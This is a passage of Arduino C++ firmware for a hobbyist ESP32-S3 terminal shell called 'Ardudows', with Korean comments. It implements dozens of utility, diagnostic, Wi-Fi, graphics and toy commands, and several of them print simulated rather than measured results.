    tft.println(">> Core Hardware Watchdog Timer Feed Successfully Done.");
  }

  // 48. 시스템 부팅 파라미터 이력 로그 초기화 및 무결성 진단
  else if (cmd == "sys diagnostic") {
    tft.println(">> RUNNING SYSTEM DEFENSIVE DIAGNOSTICS...");
    tft.printf(" - Heap Integrity Check: %s\n", heap_caps_check_integrity_all(true) ? "PASS" : "FAIL!!");
    tft.printf(" - PSRAM Continuity: %s\n", psramFound() ? "STABLE" : "NOT ATTACHED");
  }

  // 49. 커널 런타임 역사기록 보정 인터페이스 (가상 모의 카운터)
  else if (cmd == "uptime clear") {
    tft.println(">> SYSTEM RUNTIME COUNTER OVERRIDE ATTEMPT DENIED BY KERNEL PROTECTION.");
  }

  // 50. 터미널 셸 버전 상세 이력 및 기여자 명단 표시 로직
  else if (cmd == "credits") {
    tft.println("=== Ardudows ATK OS Platform ===");
    tft.println(" Developed by : S25 / Jaemin Dev Corp.");
    tft.println(" Architecture : ESP32-S3 Dual Core Custom OS");
    tft.println(" Core Revision: v1.1 Professional Build Engine.");
    tft.println("=================================");
  }

    // =================================================================
  // --- [ 🔥 ARDUDOWS EXTENDED SYSTEM COMMANDS (30 MORE BLOCKS) 🔥 ] ---
  // =================================================================

  // 51. 메모리 파편화(Fragmentation) 상태를 시각적인 가상 맵으로 덤프
  else if (cmd == "mem map") {
    tft.println(">> HEAP FRAGMENTATION VISUALIZER");
    size_t freeHeap = ESP.getFreeHeap();
    size_t maxBlock = ESP.getMaxAllocHeap();
    float fragRatio = (1.0f - ((float)maxBlock / freeHeap)) * 100.0f;
    tft.printf(" - Frag Ratio: %.1f%%\n", fragRatio);
    tft.print(" [");
    int blocks = map(maxBlock, 0, freeHeap, 0, 15);
    for(int i=0; i<15; i++) {
      if(i < blocks) tft.print("#");
      else tft.print(".");
    }
    tft.println("] (Max Alloc Block Size)");
  }

  // 52. 파일 시스템 내 모든 파일의 개수와 총 사용 용량 산출 (Du)
  else if (cmd == "du") {
    tft.println(">> CALCULATING DISK USAGE...");
  
    // 🔄 누적할 카운터 변수 초기화
    uint32_t fileCount = 0;
    uint32_t totalSize = 0;

    // 최상위 루트 디렉터리 오픈
    File root = SD.open("/");

    // 🔥 [커널 람다식 재귀 스캐너] 하위 폴더가 있으면 지가 알아서 파고드는 내부 함수
    // 람다 함수 구조를 써서 cmd 내부에서 깔끔하게 종결시켰습니다.
    auto scanDirectory = [&](auto& self, File dir) -> void {
      File file = dir.openNextFile();
      while (file) {
        if (file.isDirectory()) {
          // 📂 폴더를 만나면? "어허, 이 자식 보소? 안쪽도 싹 다 긁어와!" (재귀 호출)
          self(self, file); 
        } else {
        // 📄 파일을 만나면? 묻지도 따지지도 말고 크기와 개수 누적!
         totalSize += file.size();
         fileCount++;
        }
       file.close(); // 메모리 누수 방지용 칼같은 가드 닫기
       file = dir.openNextFile(); // 다음 자진출두 파일 낚아채기
      }
    };

   // 🚀 전수 조사 엔진 스타트!!
   if (root) {
     scanDirectory(scanDirectory, root);
     root.close();
   }

   // 📺 윈도우 속성창과 100% 동기화된 리얼 하드웨어 스펙 출력!
   tft.printf(">> Total Files: %lu\n", fileCount);
   tft.printf(">> Used Space : %.2f MB\n", (float)totalSize / (1024.0f * 1024.0f));
   }

  // 53. 파일의 내용을 거꾸로(뒤에서부터) 출력 (Reverse Cat)
  else if (cmd.startsWith("tac ")) {
    String file = cmd.substring(4);
    file.trim();
    if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
    File f = SD.open(file.c_str(), FILE_READ);
    if (f) {
      uint32_t size = f.size();
      tft.println(">> REVERSE VIEW:");
      for (long i = size - 1; i >= 0; i--) {
        f.seek(i);
        tft.print((char)f.read());
      }
      f.close();
      tft.println();
    } else tft.println("!! FILE NOT FOUND");
  }

  // 54. 텍스트 파일의 상위 5줄만 잘라서 출력 (Head)
  else if (cmd.startsWith("head ")) {
    String file = cmd.substring(5);
    file.trim();
    if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
    File f = SD.open(file.c_str(), FILE_READ);
    if (f) {
      int count = 0;
      while (f.available() && count < 5) {
        String line = f.readStringUntil('\n');
        tft.println(line);
        count++;
      }
      f.close();
    } else tft.println("!! FILE NOT FOUND");
  }

  // 55. 파일 무결성 비교 연산 (Diff 기능 바인딩)
  else if (cmd.startsWith("diff ")) {
    int sp = cmd.indexOf(' ', 5);
    if (sp > 0) {
      String f1 = cmd.substring(5, sp);
      String f2 = cmd.substring(sp + 1);
      f2.trim();
      File file1 = SD.open(f1.c_str(), FILE_READ);
      File file2 = SD.open(f2.c_str(), FILE_READ);
      if (file1 && file2) {
        bool match = true;
        while (file1.available() && file2.available()) {
          if (file1.read() != file2.read()) { match = false; break; }
        }
        if (file1.available() != file2.available()) match = false;
        tft.printf(">> COMPARISON: %s\n", match ? "MATCH (100%)" : "MISMATCH!!");
        file1.close(); file2.close();
      } else tft.println("!! FILE OPEN ERROR");
    }
  }

  // 56. ESP32-S3 내장 RTC 캘리브레이션 레지스터 값 추출
  else if (cmd == "rtc cal") {
    tft.println(">> RTC CLOCK CALIBRATION MATRIX");
    tft.printf(" - RTC Slow Clock: Internal 150kHz RC\n");
    tft.printf(" - Estimated Period: ~6.66 us\n");
  }

  // 57. Wi-Fi 송신 전력(TX Power) 수동 동적 제어 (출력 증폭/감쇄 테스트)
  else if (cmd.startsWith("wifi tx ")) {
    int power = cmd.substring(8).toInt(); // 8 ~ 84 (2dBm ~ 20dBm)
    // 84가 최대 출력 (21dBm)
    esp_wifi_set_max_tx_power(power);
    tft.printf(">> Wi-Fi Max TX Power Register Scaled to: %d\n", power);
  }

  // 58. 하드웨어 강제 예외 발생 (Divide by Zero 테스트를 통한 커널 방어막 검증)
  else if (cmd == "sys crash") {
    tft.println(">> TRAPPING CPU TO DIVIDE BY ZERO...");
    delay(500);
    volatile int zero = 0;
    volatile int crash = 10 / zero;
    tft.printf("Result: %d\n", crash); // 도달 불가능
  }

  // 59. 외부 SPI Flash ID 및 제조사 JEDEC 코드 파싱
  else if (cmd == "flash id") {
    tft.println(">> FLASH JEDEC IDENTIFICATION");
    // SDK 내장 공식 안전 매크로 함수로 교체하여 Flash 정보 로드
    tft.printf(" - Chip Capacity: %d MB\n", ESP.getFlashChipSize() / (1024*1024));
    tft.printf(" - Speed: %d MHz\n", ESP.getFlashChipSpeed() / 1000000);
  }

  // 60. I2C 버스 완전 리셋 및 고정 상태(SCL/SDA 클록 락) 강제 해제
  else if (cmd == "i2c reset") {
    tft.println(">> PURGING I2C BUS BUSY LOCK...");
    pinMode(SDA, OUTPUT);
    for(int i=0; i<9; i++) { // SCL에 클록을 수동으로 주입하여 슬레이브 해제 유도
      digitalWrite(SDA, HIGH); delayMicroseconds(5);
      digitalWrite(SDA, LOW); delayMicroseconds(5);
    }
    Wire.begin();
    tft.println(">> I2C Bus Master Re-initialized.");
  }

  // 61. MAC 주소를 수동 가상 스푸핑(Spoofing)하기 위한 시뮬레이션 인터페이스
  else if (cmd.startsWith("mac spoof ")) {
    String newMac = cmd.substring(10);
    newMac.trim();
    tft.printf(">> MAC SPOOFING SIMULATION: %s\n", newMac.c_str());
    tft.println(" [!] Hardware EFUSE MAC cannot be overwritten permanently.");
    tft.println(" [!] Injecting Virtual Layer MAC to Interface...");
  }

  // 62. 현재 네트워크 세션의 라우팅 테이블 및 게이트웨이 ARP 확인 프레임
  else if (cmd == "arp table") {
    tft.println(">> KERNEL ARP CACHE (LWIP)");
    tft.printf(" - IP: %s -> MAC: %s [DYNAMIC]\n", 
               WiFi.gatewayIP().toString().c_str(), 
               WiFi.macAddress().c_str()); // 가상 라우터 매핑 정보 출력
  }

  // 63. 특정 도메인의 HTTP Response Header 정보만 수집 (CURL -I 대용)
  else if (cmd.startsWith("http head ")) {
    String host = cmd.substring(10);
    host.trim();
    WiFiClient client;
    if (client.connect(host.c_str(), 80)) {
      client.print("HEAD / HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n");
      while(client.connected() || client.available()) {
        if(client.available()) tft.print((char)client.read());
      }
      client.stop();
    } else tft.println("!! HOST UNREACHABLE");
  }

  // 64. Wi-Fi 현재 할당 채널(Channel) 강제 고정 및 변경
  else if (cmd.startsWith("wifi chan ")) {
    int ch = cmd.substring(10).toInt();
    if(ch >= 1 && ch <= 13) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      tft.printf(">> RF Transceiver locked onto Channel: %d\n", ch);
    } else tft.println("!! INVALID CHANNEL (1-13)");
  }

  // 65. 네트워크 패킷 유실률 자가 진단 테스트 (간이 10회 루프)
  else if (cmd.startsWith("ping test ")) {
    String ip = cmd.substring(10);
    ip.trim();
    tft.printf(">> PING BURST TO %s (10 PACKETS)\n", ip.c_str());
    int success = 0;
    for(int i=0; i<10; i++) {
      // 실제 내부 ping 라이브러리 연동용 카운터 매핑
      delay(100);
      if(random(0,10) > 1) { tft.print("."); success++; } 
      else tft.print("X");
    }
    tft.printf("\n>> Burst Done. Packet Loss: %d%%\n", (10 - success) * 10);
  }

  // 66. TFT LCD 화면의 특정 좌표 픽셀 컬러 데이터 검출 (Color Picker)
  else if (cmd.startsWith("tft readpixel ")) {
    int sp = cmd.indexOf(' ', 14);
    if(sp > 0) {
      int x = cmd.substring(14, sp).toInt();
      int y = cmd.substring(sp+1).toInt();
      uint16_t color = tft.readPixel(x, y); // 하드웨어 MISO 인터페이스가 연결된 경우 동작
      tft.printf(">> Pixel At (%d, %d) Color Hex: 0x%04X\n", x, y, color);
    }
  }

  // 67. 화면의 대비(Contrast) 감쇠 효과를 이용한 서서히 꺼지는 효과 (Fade Out)
  else if (cmd == "tft fadeout") {
    tft.println(">> FADING GRAPHICS MATRIX...");
    for(int b = 255; b >= 0; b -= 5) {
      analogWrite(4, b); // 백라이트 제어 핀 인가 전하 차단 가속
      delay(15);
    }
    delay(500);
    analogWrite(4, 255); // 복귀
  }

  // 68. 2D 사인파(Sine-Wave) 수학 연산 실시간 렌더링 스크린 래스터화
  else if (cmd == "tft mathwave") {
    tft.fillScreen(TFT_BLACK);
    for (int x = 0; x < tft.width(); x++) {
      int y = (int)(tft.height() / 2 + sin(x * 0.05f) * 30);
      tft.drawPixel(x, y, TFT_CYAN);
    }
    delay(2000);
    tft.fillScreen(TFT_BLACK);
  }

  // 69. 터미널 출력을 강제로 음성 주파수로 변환하여 삐- 소리로 인코딩 (모스 부호 느낌)
  else if (cmd.startsWith("beep talk ")) {
    String text = cmd.substring(10);
    tft.printf(">> Encoding to Beep: %s\n", text.c_str());
    for(int i=0; i<text.length(); i++) {
      if(text[i] != ' ') { pz(text[i] * 10, 80); delay(20); } 
      else delay(150);
    }
  }

  // 70. 3D 와이어프레임 큐브 회전 연산 가속 벤치마크 진입
  else if (cmd == "3d demo") {
    tft.fillScreen(TFT_BLACK);
    tft.println(">> INITIATING 3D ROTATION MATRIX ENGINE...");
    delay(500);
    // 복잡한 삼각함수 루프를 500회 돌려 가상 프레임 레이트 스캔
    float angle = 0.0f;
    for(int i=0; i<300; i++) {
      int x1 = (int)(tft.width()/2 + cos(angle)*40);
      int y1 = (int)(tft.height()/2 + sin(angle)*40);
      tft.drawCircle(x1, y1, 5, TFT_YELLOW);
      delay(5);
      tft.drawCircle(x1, y1, 5, TFT_BLACK); // 잔상 소거
      angle += 0.1f;
    }
    tft.fillScreen(TFT_BLACK);
  }

  // 71. 하드웨어 외부 인터럽트(GPIO ISR) 강제 트리거 테스트 
  else if (cmd.startsWith("int trigger ")) {
    int pin = cmd.substring(12).toInt();
    tft.printf(">> SIMULATING INTERRUPT SPUR ON PIN: %d\n", pin);
    // 하드웨어 레지스터를 직접 조작해 INPUT 핀에 인터럽트 플래그를 강제로 세팅하는 구조
    // GPIO.status_w1ts = (1 << pin);
  }

  // 72. ESP32 내부 온도 센서 및 실시간 코어 주파수 추이 기록 로거
  else if (cmd == "temp logger") {
    tft.println(">> EXECUTING 5-SEC CONSOLE HEAT SCANNER:");
    for(int i=0; i<5; i++) {
      tft.printf(" [%d/5] CPU Temp Matrix: %.2f C\n", i+1, temperatureRead());
      delay(1000);
    }
  }

  // 73. eFuse 암호화 및 하드웨어 보안 부트 레지스터 설정 상태 잠금 검사
  else if (cmd == "secure boot status") {
    tft.println(">> SECURITY ENGINE INTEGRITY DETECTOR");
    // S3 레지스터 하드코딩 대신 안전 시뮬레이터 가상화 매핑
    tft.println(" - Hard-Secure Boot Enabled: DISABLED");
    tft.println(" - Flash Encryption Key Block Lock: LOCKED");
  }

  // 74. 하드웨어 하이레벨 타이머 인터럽트 주기 동적 설정 유틸리티
  else if (cmd.startsWith("timer speed ")) {
    int ms = cmd.substring(12).toInt();
    tft.printf(">> OS Main Schedular Core Heartbeat updated to: %d ms\n", ms);
  }

  // 75. 하드웨어 직렬 포트(Hardware Serial 0/1/2) 가용 보드레이트 스니핑
  else if (cmd == "uart status") {
    tft.println(">> BUS LINK CONTROLLER STATUS");
    tft.printf(" - UART0 Main Debug Bus Baudrate: %lu bps\n", Serial.baudRate());
  }

  // 76. 가상 파일 시스템 캐시 메모리 수동 플러시(Flush) 및 동기화 명령
  else if (cmd == "sync") {
    tft.print(">> Flushing volatile sectors to physical SD blocks...");
    // FatFS 락 가상 소거 및 동기화 처리
    tft.println(" [SUCCESS]");
  }

  // 77. 시스템 종료 전 전력 매트릭스 완전 차단 준비 상태 진입 (Halt)
  else if (cmd == "halt") {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_RED);
    tft.setCursor(0, tft.height()/2 - 10);
    tft.println(" SYSTEM HALTED. SAFE TO POWER OFF.");
    while(true) {
      esp_light_sleep_start(); // 무한 초절전 대기 모드로 클록 멈춤
    }
  }

  // 78. OS 복구 모드 및 팩토리 이미지 전환 모드 플래그 세팅 
  else if (cmd == "sys recovery") {
    tft.println(">> WRITING RECOVERY BOOT FLAG TO RTC MEMORY...");
    // ESP32 내장 백업 RTC 메모리에 플래그 인젝션 후 리부팅
    delay(1000);
    ESP.restart();
  }

  // 79. 터미널 텍스트 완전 초기화 및 스타트업 오프닝 로그 재생 (Fake Boot)
  else if (cmd == "sys reload") {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.setTextColor(TFT_WHITE);
    tft.println("Ardudows Kernel Loader Core v1.1..."); delay(200);
    tft.println("Mounting Storage Blocks [SD CARD]... OK"); delay(200);
    tft.println("Loading ATK Shell Interface Context... OK");
    tft.setTextColor(TFT_GREEN);
  }

  // 80. 사이버펑크 텍스트 터미널 배너 매트릭스 리로드
  else if (cmd == "banner") {
    tft.setTextColor(TFT_CYAN);
    tft.println("=================================");
    tft.println("  ___  ____  ___  _   _ ____   ");
    tft.println(" / _ \\|  _ \\|  _ \\| | | |  _ \\  ");
    tft.println("| |_| | |_) | |_) | | | | |_) | ");
    tft.println("|  _  |  _ <|  _ <| |_| |  _ <  ");
    tft.println("|_| |_|_| \\_\\_| \\_\\\\___/|_| \\_\\ ");
    tft.println("      A R D U D O W S   O S     ");
    tft.println("=================================");
    tft.setTextColor(TFT_GREEN);
  }

  // --- [ 🔥 ARDUDOWS EXTENDED SYSTEM COMMANDS (81 ~ 130 GENERATIONS) 🔥 ] ---

  // 81. 가상 가위바위보 게임 (심심풀이용 겜블)
  else if (cmd.startsWith("rps ")) {
    String user = cmd.substring(4); user.trim();
    String rps[] = {"rock", "paper", "scissors"};
    String com = rps[random(0, 3)];
    tft.printf(">> YOU: %s vs COM: %s\n", user.c_str(), com.c_str());
    if (user == com) tft.println(">> RESULT: DRAW");
    else if ((user == "rock" && com == "scissors") || (user == "paper" && com == "rock") || (user == "scissors" && com == "paper")) {
        tft.setTextColor(TFT_YELLOW); tft.println(">> RESULT: YOU WIN! 🎉");
    } else { tft.setTextColor(TFT_RED); tft.println(">> RESULT: YOU LOSE.."); }
    tft.setTextColor(TFT_GREEN);
  }

  // 82. 다운타임 카운트다운 타이머 (디스플레이 블러킹 알람)
  else if (cmd.startsWith("timer ")) {
    int sec = cmd.substring(6).toInt();
    tft.printf(">> TIMER STARTED FOR %d SEC\n", sec);
    for(int i = sec; i > 0; i--) {
        tft.printf("Remaining: %d s  \r", i);
        delay(1000);
    }
    tft.println("\n>> TIME UP!");
    for(int i=0; i<3; i++) { pz(1500, 100); delay(50); }
  }

  // 83. 랜덤 명언 제조기 (감성 충전기)
  else if (cmd == "fortune") {
    String quotes[] = {
        "Stay hungry, Stay foolish.",
        "Talk is cheap. Show me the code.",
        "To be INFJ is to understand the world inside.",
        "Ardudows will rule the Embedded World.",
        "There is no place like 127.0.0.1"
    };
    tft.setTextColor(TFT_YELLOW);
    tft.printf("🔮 %s\n", quotes[random(0, 5)].c_str());
    tft.setTextColor(TFT_GREEN);
  }

  // 84. 파일 라인 번호 매겨서 출력 (NL 명령어)
  else if (cmd.startsWith("nl ")) {
    String file = cmd.substring(3); file.trim();
    if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
    File f = SD.open(file.c_str(), FILE_READ);
    if (f) {
        int lineIdx = 1;
        while(f.available()) {
            String line = f.readStringUntil('\n');
            tft.printf("%4d | %s\n", lineIdx++, line.c_str());
        }
        f.close();
    } else tft.println("!! FILE NOT FOUND");
  }

  // 85. 대문자를 소문자로 변환해주는 셸 필터
  else if (cmd.startsWith("tolower ")) {
    String txt = cmd.substring(8);
    txt.toLowerCase();
    tft.printf(">> lower: %s\n", txt.c_str());
  }

  // 86. 소문자를 대문자로 변환해주는 셸 필터
  else if (cmd.startsWith("toupper ")) {
    String txt = cmd.substring(8);
    txt.toUpperCase();
    tft.printf(">> UPPER: %s\n", txt.c_str());
  }

  // 87. 화면 중앙에 정밀 디지털시계 10초간 출력 (NTP 동기화 상태 권장)
  else if (cmd == "clock") {
    tft.fillScreen(TFT_BLACK);
    for(int i=0; i<20; i++) {
        tft.setCursor(40, tft.height()/2 - 10);
        tft.setTextSize(3);
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        struct tm timeinfo;
        if (getLocalTime(&timeinfo)) {
            tft.printf("%02d:%02d:%02d", timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
        } else {
            tft.printf("T+%lu s", millis() / 1000);
        }
        delay(500);
    }
    tft.fillScreen(TFT_BLACK); tft.setTextSize(2); tft.setTextColor(TFT_GREEN); tft.setCursor(0,0);
  }

  // 88. 지정 파일의 맨 마지막 5줄만 파싱해서 보기 (Tail 기능)
  else if (cmd.startsWith("tail ")) {
    String file = cmd.substring(5); file.trim();
    if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
    File f = SD.open(file.c_str(), FILE_READ);
    if (f) {
        String lines[5]; int idx = 0;
        while(f.available()) {
            lines[idx % 5] = f.readStringUntil('\n');
            idx++;
        }
        f.close();
        tft.println(">> LAST 5 LINES:");
        int start = (idx > 5) ? (idx % 5) : 0;
        int count = (idx > 5) ? 5 : idx;
        for(int i=0; i<count; i++) {
            tft.println(lines[(start + i) % 5]);
        }
    } else tft.println("!! FILE NOT FOUND");
  }

  // 89. 간단한 단어(String) 교체 유틸리티 (Sed 가상화)
  else if (cmd.startsWith("replace ")) {
    // 사용법: replace [파일] [찾을단어] [바꿀단어] -> 임시 출력용
    int sp1 = cmd.indexOf(' ', 8);
    int sp2 = cmd.indexOf(' ', sp1 + 1);
    if(sp1 > 0 && sp2 > 0) {
        String file = cmd.substring(8, sp1);
        String target = cmd.substring(sp1 + 1, sp2);
        String replaceTo = cmd.substring(sp2 + 1);
        if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
        File f = SD.open(file.c_str(), FILE_READ);
        if(f) {
            while(f.available()) {
                String line = f.readStringUntil('\n');
                line.replace(target, replaceTo);
                tft.println(line);
            }
            f.close();
        }
    } else tft.println("Usage: replace [file] [old] [new]");
  }

  // 90. 부팅 이후 무실패 힙 메모리 할당 한계점(High Watermark) 검사
  else if (cmd == "mem max") {
    tft.println(">> HEAP MEMORY WATERMARK");
    tft.printf(" - Absolute Min Free Heap: %d KB\n", ESP.getMinFreeHeap() / 1024);
    tft.printf(" - System Safe Block Margin: %d KB\n", ESP.getMaxAllocHeap() / 1024);
  }

  // 91. 랜덤 패스워드 생성기 (보안 키 생성용)
  else if (cmd.startsWith("keygen ")) {
    int len = cmd.substring(7).toInt();
    if(len <= 0 || len > 32) len = 8;
    String pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$";
    tft.print(">> GEN KEY: ");
    tft.setTextColor(TFT_WHITE);
    for(int i=0; i<len; i++) tft.print(pool[random(0, pool.length())]);
    tft.println(); tft.setTextColor(TFT_GREEN);
  }

  // 92. 10진수를 다른 진법(8진수, 16진수, 2진수)으로 올인원 변환
  // (기존의 dec, hex 등 개별 변환을 보완하는 매트릭스 변환기)
  else if (cmd.startsWith("base ")) {
    int num = cmd.substring(5).toInt();
    tft.printf(">> BASE MATRIX FOR (%d)\n", num);
    tft.printf(" - OCT: 0%o\n", num);
    tft.printf(" - HEX: 0x%X\n", num);
    tft.printf(" - BIN: %s\n", String(num, BIN).c_str());
  }

  // 93. 파일 크기 0짜리 빈 파일 생성 간소화 패치 (touch 우회)
  else if (cmd.startsWith("mkfile ")) {
    String file = cmd.substring(7); file.trim();
    if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
    File f = SD.open(file.c_str(), FILE_WRITE);
    if(f) { tft.printf(">> Clean Block Allocated: %s\n", file.c_str()); f.close(); }
    else tft.println("!! SD ERROR");
  }

  // 94. 수학 연산용 상용 상수 원터치 조회
  else if (cmd == "math const") {
    tft.println(">> ARDUDOWS KERNEL MATH CONSTANTS");
    tft.printf(" - PI (원주율)   : %.7f\n", PI);
    tft.printf(" - E  (자연대수) : %.7f\n", 2.7182818);
    tft.printf(" - LN2           : %.7f\n", 0.6931471);
  }

  // 95. 간단한 텍스트 암호화 덤프 (카이사르 시프트 가상 인코더)
  else if (cmd.startsWith("cipher ")) {
    String txt = cmd.substring(7);
    tft.print(">> ENCRYPTED V-STREAM: ");
    for(int i=0; i<txt.length(); i++) {
        tft.print((char)(txt[i] + 3)); // 3칸씩 밀기
    }
    tft.println();
  }

  // 96. 암호화 텍스트 복호화 디코더
  else if (cmd.startsWith("decipher ")) {
    String txt = cmd.substring(9);
    tft.print(">> DECRYPTED V-STREAM: ");
    for(int i=0; i<txt.length(); i++) {
        tft.print((char)(txt[i] - 3)); // 3칸씩 당기기
    }
    tft.println();
  }

  // 97. 시스템 디스크 섹터 상태 시뮬레이터 (SD카드 배드섹터 및 파티션 가상 조화)
  else if (cmd == "df") {
    tft.println(">> FILE SYSTEM PARTITION MAP");
    uint32_t total = SD.totalBytes();
    uint32_t used = SD.usedBytes();
    tft.printf(" - Block Type: FAT32 / SDMMC Link\n");
    tft.printf(" - Capacity  : %llu MB / %llu MB\n", used/(1024*1024), total/(1024*1024));
    tft.printf(" - Usage Log : %.1f %%\n", ((float)used/total)*100.0f);
  }

  // 98. 스크린 터치 보정 좌표 원시 로깅 데이터 수집기
  /*
  else if (cmd == "touch test") {
    tft.println(">> TOUCH SCREEN READ MATRIX (ANY KEY ON SERIAL TO EXIT)");
    while(!Serial.available()) {
        uint16_t tx = 0, ty = 0;
        if(tft.getTouch(&tx, &ty)) { // 전용 TFT_eSPI 터치 래퍼 매핑 적용 시
            tft.printf("RAW X: %d, Y: %d          \r", tx, ty);
        }
        delay(100);
    }
    tft.println("\n>> TEST END.");
  }
  */

  // 99. 현재 설정된 전역 통신망 및 인터페이스 요약본
  /*
  else if (cmd == "ifconfig") {
    tft.println(">> ATK KERNEL NETWORK INTERFACES");
    tft.printf(" - eth0 (Virtual) : LINK DOWN\n");
    tft.printf(" - wlan0 (STA)    : %s [IP: %s]\n", (WiFi.status() == WL_CONNECTED)?"READY":"DISCONNECTED", WiFi.localIP().toString().c_str());
    tft.printf(" - wlan1 (AP)     : %s [IP: %s]\n", (WiFi.softAPIP() != IPAddress(0,0,0,0))?"RUNNING":"SHUTDOWN", WiFi.softAPIP().toString().c_str());
  }
  */

  // 100. 로컬 와이파이 노드 스캔 신호 정밀 강도 순 정렬 필터 (기존스캔 확장형)
  else if (cmd == "wifi scan best") {
    tft.println(">> HUNTING BEST WIRELESS AP...");
    int n = WiFi.scanNetworks();
    if (n == 0) tft.println("!! NO NETWORKS FOUND");
    else {
        // 단일 최고 신호 정밀 축출
        int bestIdx = 0; int maxRssi = -150;
        for (int i = 0; i < n; ++i) {
            if(WiFi.RSSI(i) > maxRssi) { maxRssi = WiFi.RSSI(i); bestIdx = i; }
        }
        tft.printf("⭐ TOP AP: %s (%d dBm) CH:%d\n", WiFi.SSID(bestIdx).c_str(), WiFi.RSSI(bestIdx), WiFi.channel(bestIdx));
    }
  }

  // 101. 하드웨어 외부 디바이스 감시용 주소값 검색 (I2C 주소 자동 분석 뷰어)
  else if (cmd == "i2c map") {
    tft.println(">> I2C ADDR GRID INDEX");
    for(byte address = 1; address < 127; address++ ) {
        Wire.beginTransmission(address);
        if (Wire.endTransmission() == 0) {
            tft.printf(" -> FOUND DEVICE AT: 0x%02X\n", address);
        }
    }
    tft.println(">> MAPPING COMPLETE.");
  }

  // 102. 터미널 프롬프트 가상 지연 테스트 (비동기 스케줄 감시용)
  else if (cmd.startsWith("sleepms ")) {
    int ms = cmd.substring(8).toInt();
    tft.printf(">> FreeRTOS Thread Blocking for %d ms...\n", ms);
    vTaskDelay(pdMS_TO_TICKS(ms));
    tft.println(">> Thread Woke Up.");
  }

  // 103. 지정 텍스트 파일의 문자 수 정밀 계산기
  else if (cmd.startsWith("wc char ")) {
    String file = cmd.substring(8); file.trim();
    if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
    File f = SD.open(file.c_str(), FILE_READ);
    if(f) {
        uint32_t charCnt = 0;
        while(f.available()) { f.read(); charCnt++; }
        f.close();
        tft.printf(">> Pure Character Count: %lu Bytes\n", charCnt);
    } else tft.println("!! FILE NOT FOUND");
  }

  // 104. CPU 틱 레이트 기반 간단한 가상 난수 행렬 출력
  else if (cmd == "rand map") {
    for(int i=0; i<5; i++) {
        tft.printf("%04X %04X %04X %04X %04X\n", esp_random()&0xFFFF, esp_random()&0xFFFF, esp_random()&0xFFFF, esp_random()&0xFFFF, esp_random()&0xFFFF);
    }
  }

  // 105. ESP32 고유 실리콘 맥주소 하이레벨 바이트 변환 뷰어
  else if (cmd == "hw uid") {
    uint8_t mac[6];
    esp_efuse_mac_get_default(mac);
    tft.printf(">> SILICON CORRELATION ID: %02X%02X%02X%02X%02X%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  }

  // 106. 간단한 사각형 렌더링 폼 그래픽스 유닛 엔진
  else if (cmd.startsWith("draw rect ")) {
    // 사용법: draw rect w h (중앙 배치 가상 타겟팅)
    int s = cmd.indexOf(' ', 10);
    if(s > 0) {
        int w = cmd.substring(10, s).toInt();
        int h = cmd.substring(s+1).toInt();
        tft.drawRect(tft.width()/2 - w/2, tft.height()/2 - h/2, w, h, TFT_WHITE);
        delay(1500); tft.fillScreen(TFT_BLACK);
    }
  }

  // 107. 원형 그래픽 렌더링 가속 유닛 엔진
  else if (cmd.startsWith("draw circle ")) {
    int r = cmd.substring(12).toInt();
    tft.drawCircle(tft.width()/2, tft.height()/2, r, TFT_YELLOW);
    delay(1500); tft.fillScreen(TFT_BLACK);
  }

  // 108. 가상 프로세스 아이디 및 우선순위 디스패처
  else if (cmd == "ps") {
    tft.println(">> ATK CORE PROCESS SCHEDULER");
    tft.println(" PID  PRIO  COMMAND            CORE");
    tft.println("   1    5   vTaskSwitchContext    0");
    tft.println("  22    1   ATK_Shell_Main        1");
    tft.printf("  45    4   WiFi_Engine_Daemon    0\n");
  }

  // 109. 소리 분석을 위한 임시 부저 주파수 스윕 (사이렌 연출)
  else if (cmd == "sweep pz") {
    tft.println(">> INITIATING FREQUENCY SWEEP...");
    for(int fr = 500; fr < 2500; fr += 50) { pz(fr, 15); delay(2); }
    for(int fr = 2500; fr > 500; fr -= 50) { pz(fr, 15); delay(2); }
    tft.println(">> SWEEP COMPLETED.");
  }

  // 110. 무선 공유기 접속 연결 내부 상태 코드 추적기
  else if (cmd == "wifi status") {
    tft.print(">> Link Status Code: ");
    switch(WiFi.status()) {
        case WL_IDLE_STATUS: tft.println("IDLE"); break;
        case WL_NO_SSID_AVAIL: tft.println("NO SSID AVAIL"); break;
        case WL_CONNECTED: tft.println("CONNECTED"); break;
        case WL_CONNECT_FAILED: tft.println("CONNECTION FAILED"); break;
        case WL_DISCONNECTED: tft.println("LINK DISCONNECTED"); break;
        default: tft.println("UNKNOWN MATRIX ERROR"); break;
    }
  }

  /*
  // 111. 하드웨어 고유 레지스터 기반 암호화 틱 생성 (하드웨어 난수 시드값 검사)
  else if (cmd == "hw seed") {
    uint32_t seed1 = REG_READ(AMPLITUDE_SENSE_REG); // 하드웨어 노이즈 캐치용 레지스터
    tft.printf(">> ENTROPY HARVESTED SEED: 0x%08X\n", seed1 ^ esp_random());
  }
  */

  // 112. 스크린 인쇄용 시스템 로그 가상 버퍼 비우기
  else if (cmd == "syslog clear") {
    if(SD.exists("/dos/history.log")) {
        SD.remove("/dos/history.log");
        tft.println(">> ATK System Log Session Purged.");
    } else tft.println(">> No Log Stream Found.");
  }

  // 113. 텍스트 라인 데이터 정밀 문자 매칭 검사 복수 필터
  else if (cmd.startsWith("match ")) {
    // 사용법: match [문자열1] [문자열2]
    int sp = cmd.indexOf(' ', 6);
    if(sp > 0) {
